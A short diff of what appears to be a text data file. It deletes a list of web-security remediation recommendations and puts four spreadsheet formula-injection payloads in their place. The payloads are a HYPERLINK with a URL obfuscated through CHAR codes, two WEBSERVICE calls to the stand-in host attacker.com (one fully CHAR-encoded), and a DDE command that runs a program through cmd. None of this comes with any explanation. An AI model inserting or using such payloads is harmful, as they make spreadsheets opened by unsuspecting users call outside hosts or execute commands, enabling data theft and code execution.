@@ -1,27 +1,4 @@
-Implement strict server-side authorization checks and validate user roles before granting access to restricted resources.
-
-Enforce server-side identity validation and prevent manipulation of user identity parameters in requests.
-
-Apply proper input validation and output encoding to sanitize user-supplied data before rendering in the browser.
-
-Enforce HTTPS for all communications and disable insecure HTTP connections.
-
-Validate and restrict email sender parameters on the server side to prevent impersonation.
-
-Ensure authentication and authorization checks are implemented before accessing sensitive reports.
-
-Avoid passing authentication tokens in URLs and use secure cookies or authorization headers instead.
-
-Implement rate limiting and request throttling mechanisms to prevent abuse of functionality.
-
-Use input validation, output encoding, and Content Security Policy (CSP) to mitigate script injection attacks.
-
-Implement strict server-side input validation using allowlists to accept only expected data formats.
-
-Configure HTTP security headers such as CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.
-
-Set cookie attributes including HttpOnly, Secure, and SameSite to protect session cookies.
-
-Avoid exposing sensitive information in client-side code and store such data securely on the server side.
-
-Implement secure error handling with generic messages and disable detailed stack traces in production.
+=HYPERLINK(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&"bing.com","click")
+=WEBSERVICE("http://attacker.com")
+=WEBSERVICE(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(97)&CHAR(116)&CHAR(116)&CHAR(97)&CHAR(99)&CHAR(107)&CHAR(101)&CHAR(114)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109))
+=cmd|' /C calc'!A0
